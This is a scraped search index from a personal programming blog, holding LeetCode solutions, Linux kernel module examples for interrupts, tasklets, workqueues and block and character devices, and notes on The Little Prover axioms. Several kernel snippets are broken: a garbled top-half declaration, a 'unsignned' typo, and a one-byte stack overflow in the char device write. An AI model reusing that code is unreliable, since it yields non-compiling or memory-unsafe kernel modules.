id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習dp\u003c/p\u003e","title":"leetcode-322 - Coin Change"},{"content":"動機 複習stack\nProblem Given a string s containing just the characters '(', ')', '{', '}', '[' and ']', determine if the input string is valid.\nAn input string is valid if:\nOpen brackets must be closed by the same type of brackets.Open brackets must be closed in the correct order. Example 1:\nInput: s = ()Output: trueExample 2:\nInput: s = ()[]{}Output: trueExample 3:\nInput: s = (]Output: falseExample 4:\nInput: s = ([)]Output: falseExample 5:\nInput: s = {[]}Output: true Constraints:\n1 \u003c= s.length \u003c= 104s consists of parentheses only '()[]{}'. Sol class Solution: def isValid(self, s: str) -\u0026gt; bool: stk = [] tbl = {\u0026#34;(\u0026#34;:\u0026#34;)\u0026#34;, \u0026#34;[\u0026#34;:\u0026#34;]\u0026#34;,\u0026#34;{\u0026#34;:\u0026#34;}\u0026#34;} lefts = list(tbl.keys()) for c in s: if c in lefts: stk.append(c) elif len(stk) \u0026gt; 0 and tbl[stk[-1]] == c: stk.pop() else: return False return len(stk) == 0 ","permalink":"https://littlebees.github.io/2021/07/leetcode-20-valid-parentheses/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習stack\u003c/p\u003e","title":"leetcode-20 - Valid Parentheses"},{"content":"動機 複習dp\nProblem A robot is located at the top-left corner of a m x n grid (marked 'Start' in the diagram below).\nThe robot can only move either down or right at any point in time. The robot is trying to reach the bottom-right corner of the grid (marked 'Finish' in the diagram below).\nHow many possible unique paths are there?\nExample 1:\nInput: m = 3, n = 7Output: 28Example 2:\nInput: m = 3, n = 2Output: 3Explanation:From the top-left corner, there are a total of 3 ways to reach the bottom-right corner:1. Right -\u003e Down -\u003e Down2. Down -\u003e Down -\u003e Right3. Down -\u003e Right -\u003e DownExample 3:\nInput: m = 7, n = 3Output: 28Example 4:\nInput: m = 3, n = 3Output: 6 Constraints:\n1 \u003c= m, n \u003c= 100It's guaranteed that the answer will be less than or equal to 2 * 109. Sol 只有回到起點才算是合法的路線\nclass Solution: @functools.lru_cache(None) def uniquePaths(self, m: int, n: int) -\u0026gt; int: if m \u0026lt;= 0 or n \u0026lt;= 0: return 0 elif m == 1 and n == 1: return 1 else: return self.uniquePaths(m,n-1) + self.uniquePaths(m-1,n) ","permalink":"https://littlebees.github.io/2021/07/leetcode-62-unique-paths/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習dp\u003c/p\u003e","title":"leetcode-62 - Unique Paths"},{"content":"動機 重新體驗binary search\n這題可以與153一起看，會有新的理解\nProblem There is an integer array nums sorted in ascending order (with distinct values).\nPrior to being passed to your function, nums is rotated at an unknown pivot index k (0 \u003c= k \u003c nums.length) such that the resulting array is [nums[k], nums[k+1], ..., nums[n-1], nums[0], nums[1], ..., nums[k-1]] (0-indexed). For example, [0,1,2,4,5,6,7] might be rotated at pivot index 3 and become [4,5,6,7,0,1,2].\nGiven the array nums after the rotation and an integer target, return the index of target if it is in nums, or -1 if it is not in nums.\nYou must write an algorithm with O(log n) runtime complexity.\nExample 1:\nInput: nums = [4,5,6,7,0,1,2], target = 0Output: 4Example 2:\nInput: nums = [4,5,6,7,0,1,2], target = 3Output: -1Example 3:\nInput: nums = [1], target = 0Output: -1 Constraints:\n1 \u003c= nums.length \u003c= 5000-104 \u003c= nums[i] \u003c= 104All values of nums are unique.nums is guaranteed to be rotated at some pivot.-104 \u003c= target \u003c= 104 Sol bsearch重要的就是\n怎麼求中點 包含中點的有序範圍 確認範圍中有沒有target，決定這塊要不要丟 而這題是只要意識到其中一邊一定會有序，就知道一定有一邊可以丟，那就只看target有沒有可能在這裡面，有就進去，沒有就另一邊\n另外就是比範圍時，只有中點不用看等於，像一開始看右邊是不是有序是ns[mid] \u0026lt; ns[mid+1] \u0026lt; ns[j-1]，但只要遇到長度為2範圍就爆了，mid+1等於j-1啊\ndef bs(ns, x, i, j): if i\u0026gt;j or i \u0026lt; 0 or i \u0026gt; len(ns): return -1 if j-i \u0026lt;= 1: return i if ns[i] == x else -1 elif j-i == 2: return i if ns[i] == x else bs(ns,x,i+1,j) else: mid = i + (j-i)//2 if ns[mid] == x: return mid else: rightasc = ns[mid] \u0026lt; ns[mid+1] \u0026lt;= ns[j-1] inright = ns[mid] \u0026lt; x \u0026lt;= ns[j-1] inleft = ns[i] \u0026lt;= x \u0026lt; ns[mid] if rightasc and inright or not rightasc and not inleft: return bs(ns,x,mid+1,j) else: return bs(ns,x,i,mid) class Solution: def search(self, nums: List[int], target: int) -\u0026gt; int: return bs(nums,target,0,len(nums)) ","permalink":"https://littlebees.github.io/2021/07/leetcode-33-search-in-rotated-sorted-array/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e重新體驗binary search\u003c/p\u003e\n\u003cp\u003e這題可以與\u003ca href=\"/2021/07/leetcode-153\"\u003e153\u003c/a\u003e一起看，會有新的理解\u003c/p\u003e","title":"leetcode-33 - Search in Rotated Sorted Array"},{"content":"動機 複習基本DP\nProblem You are climbing a staircase. It takes n steps to reach the top.\nEach time you can either climb 1 or 2 steps. In how many distinct ways can you climb to the top?\nExample 1:\nInput: n = 2Output: 2Explanation: There are two ways to climb to the top.1. 1 step + 1 step2. 2 stepsExample 2:\nInput: n = 3Output: 3Explanation: There are three ways to climb to the top.1. 1 step + 1 step + 1 step2. 1 step + 2 steps3. 2 steps + 1 step Constraints:\n1 \u003c= n \u003c= 45 Sol 只能走1或2步，而現在的步數從之前的步數延伸而來\nclass Solution: @functools.lru_cache(None) def climbStairs(self, n: int) -\u0026gt; int: if n == 1: return 1 elif n == 2: return 2 else: return self.climbStairs(n-1)+self.climbStairs(n-2) ","permalink":"https://littlebees.github.io/2021/07/leetcode-70-climbing-stairs/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習基本DP\u003c/p\u003e","title":"leetcode-70 - Climbing Stairs"},{"content":"動機 複習3sum\nProblem Given an integer array nums, return all the triplets [nums[i], nums[j], nums[k]] such that i != j, i != k, and j != k, and nums[i] + nums[j] + nums[k] == 0.\nNotice that the solution set must not contain duplicate triplets.\nExample 1:\nInput: nums = [-1,0,1,2,-1,-4]Output: [[-1,-1,2],[-1,0,1]]Example 2:\nInput: nums = []Output: []Example 3:\nInput: nums = [0]Output: [] Constraints:\n0 \u003c= nums.length \u003c= 3000-105 \u003c= nums[i] \u003c= 105 sol 列舉不難，但是要去重複很麻煩，所以在加的時候就要看有沒有重複\n反覆做2sum並一直丟掉最小的數字\nclass Solution: def threeSum(self, nums: List[int]) -\u0026gt; List[List[int]]: ret = [] nums.sort() for (i,n) in enumerate(nums): a, b = [i+1, len(nums)-1] while a \u0026lt; b: tmp = n+nums[a]+nums[b] if tmp == 0: tmp = [n,nums[a],nums[b]] tmp.sort() if tmp not in ret: ret.append(tmp) b -= 1 a += 1 elif tmp \u0026gt; 0: b -= 1 else: a += 1 return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-15-3sum/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習3sum\u003c/p\u003e","title":"leetcode-15 - 3Sum"},{"content":"動機 上次看完Linux Kernel Development 3rd，想說來補一下 大概有個感覺\nsyscall 要直接改kernel，因為是寫死的與sortirq一樣 看這裡\ntop half #include \u0026lt;linux/module.h\u0026gt; #include \u0026lt;linux/init.h\u0026gt; #include \u0026lt;linux/interrupt.h\u0026gt; #include \u0026lt;linux/delay.h\u0026gt; #include \u0026lt;linux/workqueue.h\u0026gt; #include \u0026lt;linux/kthread.h\u0026gt; #include \u0026lt;linux/slab.h\u0026gt; /* interrupt handler */ /* IRQ of your network card to be shared */ #define SHARED_IRQ 19 static int irq = SHARED_IRQ; module_param(irq, int, S_IRUGO); /* default delay time in top half -- try 10 to get results */ static int delay = 0; module_param(delay, int, S_IRUGO); static atomic_t counter_bh, counter_th; struct my_dat { unsigned long jiffies; /* used for timestamp */ struct tasklet_struct tsk; /* used in dynamic tasklet solution */ struct work_struct work; /* used in dynamic workqueue solution */ } my_data; static struct my_dat static irqreturn_t my_interrupt (int irq, void *dev_id) { top_half_fun(); tasklet_schedule(\u0026amp;t_name); return IRQ_HANDLED; } static int __init my_generic_init(void) { atomic_set(\u0026amp;counter_bh, 0); atomic_set(\u0026amp;counter_th, 0); /* use my_data for dev_id */ if (request_irq(irq, my_interrupt, IRQF_SHARED, \u0026#34;my_int\u0026#34;, \u0026amp;my_data)) return -1; printk(KERN_INFO \u0026#34;successfully loaded\\n\u0026#34;); return 0; } static void __exit my_generic_exit(void) { synchronize_irq(irq); free_irq(irq, \u0026amp;my_data); printk(KERN_INFO \u0026#34; counter_th = %d, counter_bh = %d\\n\u0026#34;, atomic_read(\u0026amp;counter_th), atomic_read(\u0026amp;counter_bh)); printk(KERN_INFO \u0026#34;successfully unloaded\\n\u0026#34;); } /* https://www.cs.otago.ac.nz/cosc440/labs/lab08.pdf */ bottom half (tasklet) #include \u0026lt;linux/module.h\u0026gt; #include \u0026lt;linux/sched.h\u0026gt; #include \u0026lt;linux/interrupt.h\u0026gt; #include \u0026lt;linux/slab.h\u0026gt; #include \u0026lt;linux/init.h\u0026gt; typedef struct simp_t { int i; int j; } simp; static simp t_data; /* tasklet bottom half */ static void t_fun(unsignned long t_arg) { simp *datum = \u0026amp;t_data; printk(KERN_INFO \u0026#34;Entering t_fun, datum-\u0026gt;i = %d, jiffies = %ld\\n\u0026#34;, datum-\u0026gt;i, jiffies); printk(KERN_INFO \u0026#34;Entering t_fun, datum-\u0026gt;j = %d, jiffies = %ld\\n\u0026#34;, datum-\u0026gt;j, jiffies); } DECLARE_TASKLET_OLD (t_name, t_fun); static int __init my_init(void) { printk(KERN_INFO \u0026#34;\\nHello: my_init loaded at address 0x%p\\n\u0026#34;, my_init); t_data.i = 100; t_data.j = 200; printk(KERN_INFO \u0026#34;scheduling my tasklet, jiffies = %ld\\n\u0026#34;, jiffies); tasklet_schedule(\u0026amp;t_name); return 0; } static void __exit my_exit(void) { printk(KERN_INFO \u0026#34;\\nHello: my_exit loaded at address 0x%p\\n\u0026#34;, my_exit); } module_init(my_init); module_exit(my_exit); /* https://www.cs.otago.ac.nz/cosc440/labs/lab08.pdf */ bottom half (workqueue) #include \u0026lt;linux/kernel.h\u0026gt; #include \u0026lt;linux/module.h\u0026gt; #include \u0026lt;linux/workqueue.h\u0026gt; MODULE_LICENSE(\u0026#34;GPL\u0026#34;); static struct workqueue_struct *queue; static void work_func(struct work_struct *work) { printk(KERN_INFO \u0026#34;worker\\n\u0026#34;); } DECLARE_WORK(work, work_func); int init_module(void) { queue = create_singlethread_workqueue(\u0026#34;myworkqueue\u0026#34;); queue_work(queue, \u0026amp;work); return 0; } void cleanup_module(void) { /* why is this needed? Why flush_workqueue doesn\u0026#39;t work? (re-insmod panics) * http://stackoverflow.com/questions/37216038/whats-the-difference-between-flush-delayed-work-and-cancel-delayed-work-sync */ /*flush_workqueue(queue);*/ cancel_work_sync(\u0026amp;work); destroy_workqueue(queue); } /* https://github.com/cirosantilli/linux-kernel-module-cheat/blob/ad077d3943f79c0f6481dab929970613c33c31a7/kernel_module/workqueue_cheat.c */ device driver major number是裝置的編號，像用ls -l去看tty都是4 minor number是看major number決定他有什麼意義\nblock 類似array\n#include \u0026lt;linux/init.h\u0026gt; #include \u0026lt;linux/module.h\u0026gt; #include \u0026lt;linux/slab.h\u0026gt; #include \u0026lt;linux/vmalloc.h\u0026gt; #include \u0026lt;linux/fs.h\u0026gt; #include \u0026lt;linux/genhd.h\u0026gt; #include \u0026lt;linux/blkdev.h\u0026gt; #include \u0026lt;linux/buffer_head.h\u0026gt; #include \u0026lt;linux/blk-mq.h\u0026gt; #include \u0026lt;linux/hdreg.h\u0026gt; #ifndef SECTOR_SIZE #define SECTOR_SIZE 512 #endif static int dev_major = 0; /* Just internal representation of the our block device * can hold any useful data */ struct block_dev { sector_t capacity; u8 *data; /* Data buffer to emulate real storage device */ struct blk_mq_tag_set tag_set; struct request_queue *queue; struct gendisk *gdisk; }; /* Device instance */ static struct block_dev *block_device = NULL; static int blockdev_open(struct block_device *dev, fmode_t mode) { printk(\u0026#34;\u0026gt;\u0026gt;\u0026gt; blockdev_open\\n\u0026#34;); return 0; } static void blockdev_release(struct gendisk *gdisk, fmode_t mode) { printk(\u0026#34;\u0026gt;\u0026gt;\u0026gt; blockdev_release\\n\u0026#34;); } int blockdev_ioctl(struct block_device *bdev, fmode_t mode, unsigned cmd, unsigned long arg) { printk(\u0026#34;ioctl cmd 0x%08x\\n\u0026#34;, cmd); return -ENOTTY; } /* Set block device file I/O */ static struct block_device_operations blockdev_ops = { .owner = THIS_MODULE, .open = blockdev_open, .release = blockdev_release, .ioctl = blockdev_ioctl }; /* Serve requests */ static int do_request(struct request *rq, unsigned int *nr_bytes) { int ret = 0; struct bio_vec bvec; struct req_iterator iter; struct block_dev *dev = rq-\u0026gt;q-\u0026gt;queuedata; loff_t pos = blk_rq_pos(rq) \u0026lt;\u0026lt; SECTOR_SHIFT; loff_t dev_size = (loff_t)(dev-\u0026gt;capacity \u0026lt;\u0026lt; SECTOR_SHIFT); printk(KERN_WARNING \u0026#34;sblkdev: request start from sector %lld pos = %lld dev_size = %lld\\n\u0026#34;, blk_rq_pos(rq), pos, dev_size); /* Iterate over all requests segments */ rq_for_each_segment(bvec, rq, iter) { unsigned long b_len = bvec.bv_len; /* Get pointer to the data */ void* b_buf = page_address(bvec.bv_page) + bvec.bv_offset; /* Simple check that we are not out of the memory bounds */ if ((pos + b_len) \u0026gt; dev_size) { b_len = (unsigned long)(dev_size - pos); } if (rq_data_dir(rq) == WRITE) { /* Copy data to the buffer in to required position */ memcpy(dev-\u0026gt;data + pos, b_buf, b_len); } else { /* Read data from the buffer\u0026#39;s position */ memcpy(b_buf, dev-\u0026gt;data + pos, b_len); } /* Increment counters */ pos += b_len; *nr_bytes += b_len; } return ret; } /* queue callback function */ static blk_status_t queue_rq(struct blk_mq_hw_ctx *hctx, const struct blk_mq_queue_data* bd) { unsigned int nr_bytes = 0; blk_status_t status = BLK_STS_OK; struct request *rq = bd-\u0026gt;rq; /* Start request serving procedure */ blk_mq_start_request(rq); if (do_request(rq, \u0026amp;nr_bytes) != 0) { status = BLK_STS_IOERR; } /* Notify kernel about processed nr_bytes */ if (blk_update_request(rq, status, nr_bytes)) { /* Shouldn\u0026#39;t fail */ BUG(); } /* Stop request serving procedure */ __blk_mq_end_request(rq, status); return status; } static struct blk_mq_ops mq_ops = { .queue_rq = queue_rq, }; static int __init myblock_driver_init(void) { /* Register new block device and get device major number */ dev_major = register_blkdev(dev_major, \u0026#34;testblk\u0026#34;); block_device = kmalloc(sizeof (struct block_dev), GFP_KERNEL); if (block_device == NULL) { printk(\u0026#34;Failed to allocate struct block_dev\\n\u0026#34;); unregister_blkdev(dev_major, \u0026#34;testblk\u0026#34;); return -ENOMEM; } /* Set some random capacity of the device */ block_device-\u0026gt;capacity = (112 * PAGE_SIZE) \u0026gt;\u0026gt; 9; /* nsectors * SECTOR_SIZE; */ /* Allocate corresponding data buffer */ block_device-\u0026gt;data = kmalloc(block_device-\u0026gt;capacity \u0026lt;\u0026lt; 9, GFP_KERNEL); if (block_device-\u0026gt;data == NULL) { printk(\u0026#34;Failed to allocate device IO buffer\\n\u0026#34;); unregister_blkdev(dev_major, \u0026#34;testblk\u0026#34;); kfree(block_device); return -ENOMEM; } printk(\u0026#34;Initializing queue\\n\u0026#34;); block_device-\u0026gt;queue = blk_mq_init_sq_queue(\u0026amp;block_device-\u0026gt;tag_set, \u0026amp;mq_ops, 128, BLK_MQ_F_SHOULD_MERGE); if (block_device-\u0026gt;queue == NULL) { printk(\u0026#34;Failed to allocate device queue\\n\u0026#34;); kfree(block_device-\u0026gt;data); unregister_blkdev(dev_major, \u0026#34;testblk\u0026#34;); kfree(block_device); return -ENOMEM; } /* Set driver\u0026#39;s structure as user data of the queue */ block_device-\u0026gt;queue-\u0026gt;queuedata = block_device; /* Allocate new disk */ block_device-\u0026gt;gdisk = alloc_disk(1); /* Set all required flags and data */ block_device-\u0026gt;gdisk-\u0026gt;flags = GENHD_FL_NO_PART_SCAN; block_device-\u0026gt;gdisk-\u0026gt;major = dev_major; block_device-\u0026gt;gdisk-\u0026gt;first_minor = 0; block_device-\u0026gt;gdisk-\u0026gt;fops = \u0026amp;blockdev_ops; block_device-\u0026gt;gdisk-\u0026gt;queue = block_device-\u0026gt;queue; block_device-\u0026gt;gdisk-\u0026gt;private_data = block_device; /* Set device name as it will be represented in /dev */ strncpy(block_device-\u0026gt;gdisk-\u0026gt;disk_name, \u0026#34;blockdev\\0\u0026#34;, 9); printk(\u0026#34;Adding disk %s\\n\u0026#34;, block_device-\u0026gt;gdisk-\u0026gt;disk_name); /* Set device capacity */ set_capacity(block_device-\u0026gt;gdisk, block_device-\u0026gt;capacity); /* Notify kernel about new disk device */ add_disk(block_device-\u0026gt;gdisk); return 0; } static void __exit myblock_driver_exit(void) { /* Don\u0026#39;t forget to cleanup everything */ if (block_device-\u0026gt;gdisk) { del_gendisk(block_device-\u0026gt;gdisk); put_disk(block_device-\u0026gt;gdisk); } if (block_device-\u0026gt;queue) { blk_cleanup_queue(block_device-\u0026gt;queue); } kfree(block_device-\u0026gt;data); unregister_blkdev(dev_major, \u0026#34;testblk\u0026#34;); kfree(block_device); } module_init(myblock_driver_init); module_exit(myblock_driver_exit); MODULE_LICENSE(\u0026#34;GPL\u0026#34;); char stream of chars\n#include \u0026lt;linux/init.h\u0026gt; #include \u0026lt;linux/module.h\u0026gt; #include \u0026lt;linux/cdev.h\u0026gt; #include \u0026lt;linux/device.h\u0026gt; #include \u0026lt;linux/kernel.h\u0026gt; #include \u0026lt;linux/uaccess.h\u0026gt; #include \u0026lt;linux/fs.h\u0026gt; #define MAX_DEV 2 static int mychardev_open(struct inode *inode, struct file *file); static int mychardev_release(struct inode *inode, struct file *file); static long mychardev_ioctl(struct file *file, unsigned int cmd, unsigned long arg); static ssize_t mychardev_read(struct file *file, char __user *buf, size_t count, loff_t *offset); static ssize_t mychardev_write(struct file *file, const char __user *buf, size_t count, loff_t *offset); static const struct file_operations mychardev_fops = { .owner = THIS_MODULE, .open = mychardev_open, .release = mychardev_release, .unlocked_ioctl = mychardev_ioctl, .read = mychardev_read, .write = mychardev_write }; struct mychar_device_data { struct cdev cdev; }; static int dev_major = 0; static struct class *mychardev_class = NULL; static struct mychar_device_data mychardev_data[MAX_DEV]; static int mychardev_uevent(struct device *dev, struct kobj_uevent_env *env) { add_uevent_var(env, \u0026#34;DEVMODE=%#o\u0026#34;, 0666); return 0; } static int __init mychardev_init(void) { int err, i; dev_t dev; err = alloc_chrdev_region(\u0026amp;dev, 0, MAX_DEV, \u0026#34;mychardev\u0026#34;); dev_major = MAJOR(dev); mychardev_class = class_create(THIS_MODULE, \u0026#34;mychardev\u0026#34;); mychardev_class-\u0026gt;dev_uevent = mychardev_uevent; for (i = 0; i \u0026lt; MAX_DEV; i++) { cdev_init(\u0026amp;mychardev_data[i].cdev, \u0026amp;mychardev_fops); mychardev_data[i].cdev.owner = THIS_MODULE; cdev_add(\u0026amp;mychardev_data[i].cdev, MKDEV(dev_major, i), 1); device_create(mychardev_class, NULL, MKDEV(dev_major, i), NULL, \u0026#34;mychardev-%d\u0026#34;, i); } return 0; } static void __exit mychardev_exit(void) { int i; for (i = 0; i \u0026lt; MAX_DEV; i++) { device_destroy(mychardev_class, MKDEV(dev_major, i)); } class_unregister(mychardev_class); class_destroy(mychardev_class); unregister_chrdev_region(MKDEV(dev_major, 0), MINORMASK); } static int mychardev_open(struct inode *inode, struct file *file) { printk(\u0026#34;MYCHARDEV: Device open\\n\u0026#34;); return 0; } static int mychardev_release(struct inode *inode, struct file *file) { printk(\u0026#34;MYCHARDEV: Device close\\n\u0026#34;); return 0; } static long mychardev_ioctl(struct file *file, unsigned int cmd, unsigned long arg) { printk(\u0026#34;MYCHARDEV: Device ioctl\\n\u0026#34;); return 0; } static ssize_t mychardev_read(struct file *file, char __user *buf, size_t count, loff_t *offset) { uint8_t *data = \u0026#34;Hello from the kernel world!\\n\u0026#34;; size_t datalen = strlen(data); printk(\u0026#34;Reading device: %d\\n\u0026#34;, MINOR(file-\u0026gt;f_path.dentry-\u0026gt;d_inode-\u0026gt;i_rdev)); if (count \u0026gt; datalen) { count = datalen; } if (copy_to_user(buf, data, count)) { return -EFAULT; } return count; } static ssize_t mychardev_write(struct file *file, const char __user *buf, size_t count, loff_t *offset) { size_t maxdatalen = 30, ncopied; uint8_t databuf[maxdatalen]; printk(\u0026#34;Writing device: %d\\n\u0026#34;, MINOR(file-\u0026gt;f_path.dentry-\u0026gt;d_inode-\u0026gt;i_rdev)); if (count \u0026lt; maxdatalen) { maxdatalen = count; } ncopied = copy_from_user(databuf, buf, maxdatalen); if (ncopied == 0) { printk(\u0026#34;Copied %zd bytes from the user\\n\u0026#34;, maxdatalen); } else { printk(\u0026#34;Could\u0026#39;t copy %zd bytes from the user\\n\u0026#34;, ncopied); } databuf[maxdatalen] = 0; printk(\u0026#34;Data from the user: %s\\n\u0026#34;, databuf); return count; } MODULE_LICENSE(\u0026#34;GPL\u0026#34;); MODULE_AUTHOR(\u0026#34;Oleg Kutkov \u0026lt;elenbert@gmail.com\u0026gt;\u0026#34;); module_init(mychardev_init); module_exit(mychardev_exit); /* https://olegkutkov.me/2018/03/14/simple-linux-character-device-driver/ */ ","permalink":"https://littlebees.github.io/2021/07/top-half-bottom-half-workqueue-device%E7%AF%84%E4%BE%8B%E9%9B%86/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e上次看完\u003ca href=\"/2021/06/Linux-Kernel-Development-3rd-note\"\u003eLinux Kernel Development 3rd\u003c/a\u003e，想說來補一下\n大概有個感覺\u003c/p\u003e","title":"top half \u0026 bottom half \u0026 workqueue \u0026 device範例集"},{"content":"動機 複習判圈\nProblem Given head, the head of a linked list, determine if the linked list has a cycle in it.\nThere is a cycle in a linked list if there is some node in the list that can be reached again by continuously following the next pointer. Internally, pos is used to denote the index of the node that tail's next pointer is connected to. Note that pos is not passed as a parameter.\nReturn true if there is a cycle in the linked list. Otherwise, return false.\nExample 1:\nInput: head = [3,2,0,-4], pos = 1Output: trueExplanation: There is a cycle in the linked list, where the tail connects to the 1st node (0-indexed).Example 2:\nInput: head = [1,2], pos = 0Output: trueExplanation: There is a cycle in the linked list, where the tail connects to the 0th node.Example 3:\nInput: head = [1], pos = -1Output: falseExplanation: There is no cycle in the linked list. Constraints:\nThe number of the nodes in the list is in the range [0, 104].-105 \u003c= Node.val \u003c= 105pos is -1 or a valid index in the linked-list. Follow up: Can you solve it using O(1) (i.e. constant) memory?\nSol class Solution: def hasCycle(self, head: ListNode) -\u0026gt; bool: if head is None or head.next is None: return False a = b = head while b is not None and b.next is not None: a = a.next b = b.next.next if a is b: break return a is b 原本想著怎麼把break拿掉，結果看到以前的code 直接把比較快的加一就ok了\u0026hellip;\nclass Solution { public: bool hasCycle(ListNode *head) { if(!head || head-\u0026gt;next == NULL) return 0; ListNode * a = head; ListNode * b = head-\u0026gt;next; for(;(b \u0026amp;\u0026amp; b-\u0026gt;next) \u0026amp;\u0026amp; a != b;a=a-\u0026gt;next,b=b-\u0026gt;next-\u0026gt;next); return a == b; } }; ","permalink":"https://littlebees.github.io/2021/07/leetcode-141-linked-list-cycle/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習判圈\u003c/p\u003e","title":"leetcode-141 - Linked List Cycle"},{"content":"動機 複習dfs與bfs\nProblem Given the roots of two binary trees p and q, write a function to check if they are the same or not.\nTwo binary trees are considered the same if they are structurally identical, and the nodes have the same value.\nExample 1:\nInput: p = [1,2,3], q = [1,2,3]Output: trueExample 2:\nInput: p = [1,2], q = [1,null,2]Output: falseExample 3:\nInput: p = [1,2,1], q = [1,1,2]Output: false Constraints:\nThe number of nodes in both trees is in the range [0, 100].-104 \u003c= Node.val \u003c= 104 Sol def bfs(root): q = deque() q.append(root) ret = [] while q: r = q.popleft() if r: q.append(r.left) q.append(r.right) ret.append(r.val) else: ret.append(None) return ret def dfs(r, ret): if r: ret.append(r.val) return dfs(r.right,dfs(r.left,ret)) else: ret.append(None) return ret class Solution: def isSameTree(self, p: TreeNode, q: TreeNode) -\u0026gt; bool: return dfs(p,[]) == dfs(q,[]) Sol2 直接在tree上遞迴\nclass Solution: def isSameTree(self, p: TreeNode, q: TreeNode) -\u0026gt; bool: if p is None and q is None: return True elif p is None or q is None: return False else: return p.val == q.val and self.isSameTree(p.left,q.left) and self.isSameTree(p.right,q.right) ","permalink":"https://littlebees.github.io/2021/07/leetcode-100-same-tree/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習dfs與bfs\u003c/p\u003e","title":"leetcode-100 - Same Tree"},{"content":"動機 解一解\nProblem Given an integer array nums, find the contiguous subarray (containing at least one number) which has the largest sum and return its sum.\nA subarray is a contiguous part of an array.\nExample 1:\nInput: nums = [-2,1,-3,4,-1,2,1,-5,4]Output: 6Explanation: [4,-1,2,1] has the largest sum = 6.Example 2:\nInput: nums = [1]Output: 1Example 3:\nInput: nums = [5,4,-1,7,8]Output: 23 Constraints:\n1 \u003c= nums.length \u003c= 3 * 104-105 \u003c= nums[i] \u003c= 105 Follow up: If you have figured out the O(n) solution, try coding another solution using the divide and conquer approach, which is more subtle.\nSol def helper(l): if len(l) == 0: return 0 ret = tmp = l[0] for n in l[1:]: tmp += n ret = max(ret, tmp) return ret class Solution: def maxSubArray(self, l: List[int]) -\u0026gt; int: if not l: return 0 if len(l) == 1: return l[0] else: if len(l) % 2 == 0: mid = len(l) // 2 onlyLeft = self.maxSubArray(l[:mid]) onlyRight = self.maxSubArray(l[mid:]) center = 0 left = helper(l[:mid][::-1]) right = helper(l[mid:]) else: mid = len(l) // 2 onlyLeft = self.maxSubArray(l[:mid+1]) onlyRight = self.maxSubArray(l[mid:]) center = l[mid] left = helper(l[:mid][::-1]) right = helper(l[mid+1:]) return max([center + left + right, onlyLeft, onlyRight]) Sol2 class Solution: def maxSubArray(self, nums: List[int]) -\u0026gt; int: ret = tmp = nums[0] for n in nums[1:]: tmp = max(n, n+tmp) ret = max(ret, tmp) return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-53-maximum-subarray/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e解一解\u003c/p\u003e","title":"leetcode-53 - Maximum Subarray"},{"content":"動機 lambda加map好方便\nProblem Given an array of integers nums and an integer target, return indices of the two numbers such that they add up to target.\nYou may assume that each input would have exactly one solution, and you may not use the same element twice.\nYou can return the answer in any order.\nExample 1:\nInput: nums = [2,7,11,15], target = 9Output: [0,1]Output: Because nums[0] + nums[1] == 9, we return [0, 1].Example 2:\nInput: nums = [3,2,4], target = 6Output: [1,2]Example 3:\nInput: nums = [3,3], target = 6Output: [0,1] Constraints:\n2 \u003c= nums.length \u003c= 104-109 \u003c= nums[i] \u003c= 109-109 \u003c= target \u003c= 109Only one valid answer exists. Follow-up: Can you come up with an algorithm that is less than O(n2) time complexity? Sol 先把原本的index加到list，之後sort 做two pointer\nclass Solution: def twoSum(self, nums: List[int], target: int) -\u0026gt; List[int]: nums = [(n,i) for (i,n) in enumerate(nums)] nums.sort(key=lambda a: a[0]) i,j = [0, len(nums)-1] while i \u0026lt; j: if nums[i][0]+nums[j][0] == target: return [nums[i][1], nums[j][1]] elif nums[i][0]+nums[j][0] \u0026gt;= target: j -= 1 else: i += 1 ","permalink":"https://littlebees.github.io/2021/07/leetcode-1-two-sum/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003elambda加map好方便\u003c/p\u003e","title":"leetcode-1 - Two Sum"},{"content":"動機 久遠筆記搬到github這裡，不過也是改寫超多東西的\nkeyword premise，在if的條件有可以用在想改寫的東西\ntheorem，永遠為true的expression (要證過)\naxiom，不用證明的theorem\nclaim，還沒證的theorem\ndefun，函數，但應該當成類似macro的東西\ntotal，不論什麼參數都會有值的函數\naxioms (dethm equal-same (x) (equal (equal x x) \u0026#39;t)) (dethm equal-swap (x y) (equal (equal x y) (equal y x))) (dethm equal-if (x y) (if (equal x y) (equal x y) \u0026#39;t)) (dethm if-true (x y) (equal (if \u0026#39;t x y) x)) (dethm if-false (x y) (equal (if \u0026#39;nil x y) y)) (dethm if-same (x y) (equal (if x y y) y)) (dethm if-nest-A (x y z) (if x (equal (if x y z) y) \u0026#39;t)) (dethm if-nest-E (x y z) (if x \u0026#39;t (equal (if x y z) z))) (dethm atom/cons (x y) (equal (atom (cons x y)) \u0026#39;nil)) (dethm car/cons (x y) (equal (car (cons x y)) x)) (dethm cons/car+cdr (x) (if (atom x) \u0026#39;t (equal (cons (car x) (cdr x)) x))) (dethm cdr/cons (x y) (equal (cdr (cons x y)) y)) (dethm natp/size (x) (equal (natp (size x)) \u0026#39;t)) (dethm size/car (x) (if (atom x) \u0026#39;t (equal (\u0026lt; (size (car x)) (size x)) \u0026#39;t))) (dethm size/cdr (x) (if (atom x) \u0026#39;t (equal (\u0026lt; (size (cdr x)) (size x)) \u0026#39;t))) (dethm identity-+ (x) (if (natp x) (equal (+ 0 x) x) ‘t)) (dethm commute-+ (x y) (equal (+ x y) (+ y x))) (dethm associate+ (x y z) (equal (+ (+ x y) z) (+ x (+ y z)))) (dethm positives+ (x y) (if (\u0026lt; 0 x) (if (\u0026lt; 0 y) (equal (\u0026lt; 0 (+ x y)) ‘t) ‘t) 